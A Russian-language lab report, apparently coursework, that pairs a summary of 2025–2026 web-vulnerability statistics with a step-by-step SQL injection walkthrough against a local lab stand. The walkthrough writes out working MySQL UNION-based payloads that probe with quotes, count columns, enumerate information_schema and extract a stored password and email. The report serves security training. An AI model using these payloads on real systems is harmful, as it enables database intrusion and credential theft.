Введение

Краткий анализ статистики веб-уязвимостей за 2025–2026 гг. и задокументированный протокол практической эксплуатации уязвимости SQL-инъекции (в формате «черного ящика»).

Часть I. Аналитический обзор статистики (2025–2026 гг.)

1. Источники данных

Анализ базируется на глобальных и российских исследованиях за 2025–2026 годы:

  • Verizon DBIR 2025
  • Positive Technologies 2025
  • OWASP Top 10: 2025
  • Solar 4RAYS
  • BI.ZONE Threat Zone 2026
  • Kaspersky Security Bulletin 2025
  • IBM X-Force 2026
  • Check Point Security Report 2026

2. Доля успешных атак через веб-уязвимости

  • Глобальный уровень (Verizon 2025): 12% всех утечек составили прямые веб-атаки. Эксплуатация уязвимостей как начальный вектор доступа достигла 20%.
  • Глобальный уровень (IBM X-Force 2026): Эксплуатация публично доступных приложений выросла на 44%, при этом 56% уязвимостей не требовали аутентификации.
  • Россия и СНГ (Positive Technologies): Эксплуатация уязвимостей привела к 31% успешных атак на организации.
  • Россия (Solar 4RAYS): В 2025 году количество веб-уязвимостей выросло в 3,2 раза, 4% из них имели максимальный уровень критичности (CVSS 10.0).

3. Отраслевое распределение веб-атак

Отрасль Доля атак Основная мотивация / Причины

4. Распределение по конкретным уязвимостям (OWASP Top 10 2025)

  • A01: Broken Access Control (Охват 42.9%): Абсолютный лидер. Включает IDOR и SSRF.
  • A02: Security Misconfiguration (Охват 52.3%): Небезопасные настройки по умолчанию, открытые облачные бакеты.
  • A03: Software Supply Chain Failures: Компрометация сторонних библиотек и CI/CD процессов.
  • A04: Cryptographic Failures: Слабое хеширование и отсутствие HTTPS.
  • A05: Injection: SQL, NoSQL инъекции (остаются актуальными для legacy-систем).

Новый вектор (AI-сервисы): Check Point зафиксировал, что 90% организаций столкнулись с рисками ИИ-промптов (Prompt Injection). Solar 4RAYS выделяет 5% всех новых уязвимостей в AI-решениях из-за генерации кода нейросетями без аудита («вайбкодинга»).

Часть II. Практическая эксплуатация (SQL-инъекция)

Целевой стенд: http://localhost:8080/task/

1. Разведка и фаззинг

  • Легитимный ввод: Параметр id определяет вывод.
    • id=1 (admin), id=4 (Vinni-pukh), id=9 (Volk2).
  • Поиск уязвимости: Запрос ?id=1' возвращает фатальную ошибку: You have an error in your SQL syntax... near ''1'''. Это подтверждает отсутствие санитизации и указывает на СУБД MySQL.
  • Логическая инъекция: ?id=1' OR 1=1--+ выполняется, но выдает только первую запись (admin), так как backend запрашивает лишь одну строку. Необходим UNION SELECT.

2. Определение размерности запроса

Требуется узнать количество колонок оригинального запроса с помощью ORDER BY:

?id=1' ORDER BY 3--+ /* Успех */
?id=1' ORDER BY 4--+ /* Ошибка */

Вывод: Используется 3 столбца. Смещаем вывод ложным ID: ?id=-1' UNION SELECT 1,2,3--+ (на странице выводятся позиции 1 и 2).

3. Извлечение метаданных

  • Имя базы данных:
  ?id=-1' UNION SELECT 1,database(),3--+

Результат: security

  • Таблицы: 
    ?id=-1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='security'--+
    Результат: emails, users
  • Структура таблиц:
    • Колонки users: id, username, password
    • Колонки emails: id, email_id

4. Финальная эксплуатация и ответы

Задание 1: Пароль пользователя Volk2 (id=9)

?id=-1' UNION SELECT 1,password,3 FROM users WHERE username='Volk2'--+
  • Ответ: Пароль пользователя Volk2 — Wa spoiuuuuu.

Задание 2: Почта пользователя Vinni-pukh (id=4)

  • Ошибочная попытка: Поиск по имени WHERE username='Vinni-pukh' в таблице emails вызывает ошибку (нет такого столбца, связь идет по id).
  • Успешный запрос:
?id=-1' UNION SELECT 1,email_id,3 FROM emails WHERE id=4--+
  • Ответ: Почта пользователя Vinni-pukh — honey_lover@otus-lab.com.

Заключение

Аналитика 2025–2026 гг. фиксирует рост атак на цепочки поставок и AI-сервисы, однако классические уязвимости фильтрации (OWASP A05 - Injection) всё еще остаются критичным вектором. Практическая часть доказала, что отсутствие параметризации запросов позволяет тривиально извлечь схему БД и эксфильтровать учетные данные (пароли и email).
